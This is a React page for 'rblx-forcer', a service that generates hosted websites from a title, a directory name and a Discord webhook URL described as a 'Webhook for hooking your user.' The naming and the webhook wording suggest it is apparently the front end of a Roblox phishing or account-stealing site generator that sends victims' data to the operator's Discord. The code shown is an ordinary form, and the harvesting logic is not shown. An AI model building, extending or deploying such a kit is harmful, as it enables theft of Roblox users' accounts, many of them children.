import { useState } from "react";

export default function Home() {
  const [title, setTitle] = useState("");
  const [directory, setDirectory] = useState("");
  const [webhook, setWebhook] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage("");

    const res = await fetch("/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ title, directory, webhook }),
    });

    const data = await res.json();
    setLoading(false);

    if (res.ok) {
      setMessage(`✅ Website created! Visit: https://rblx-forcer.vercel.app/${directory}`);
    } else {
      setMessage(`❌ Error: ${data.error || "Something went wrong"}`);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 to-blue-100 p-6">
      <div className="bg-white shadow-xl rounded-2xl p-8 w-full max-w-md border border-gray-200">
        <h1 className="text-3xl font-bold text-blue-600 mb-4 text-center">
          🌐 Generate Website
        </h1>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-1">
              Title
            </label>
            <input
              type="text"
              placeholder="Enter your site title"
              value={title}
              onChange={(e) => setTitle(e.target.value)}
              required
              className="w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-400"
            />
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-1">
              Directory Name
            </label>
            <input
              type="text"
              placeholder="your-directory"
              value={directory}
              onChange={(e) => setDirectory(e.target.value.toLowerCase())}
              required
              className="w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-400"
            />
            <p className="text-xs text-gray-500 mt-1">
              Will create: https://rblx-forcer.vercel.app/{directory || "your-directory"}
            </p>
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-1">
              Webhook URL
            </label>
            <input
              type="url"
              placeholder="https://discord.com/api/webhooks/..."
              value={webhook}
              onChange={(e) => setWebhook(e.target.value)}
              required
              className="w-full p-2 border rounded-lg focus:ring-2 focus:ring-blue-400"
            />
            <p className="text-xs text-gray-500 mt-1">
              Webhook for hooking your user.
            </p>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-lg transition duration-200"
          >
            {loading ? "Generating..." : "Generate Website"}
          </button>
        </form>

        {message && (
          <p
            className={`mt-4 text-center text-sm ${
              message.startsWith("✅") ? "text-green-600" : "text-red-600"
            }`}
          >
            {message}
          </p>
        )}
      </div>

      <footer className="mt-8 text-gray-500 text-sm">
        © 2025 rblx-forcer — All rights reserved.
      </footer>
    </div>
  );
}
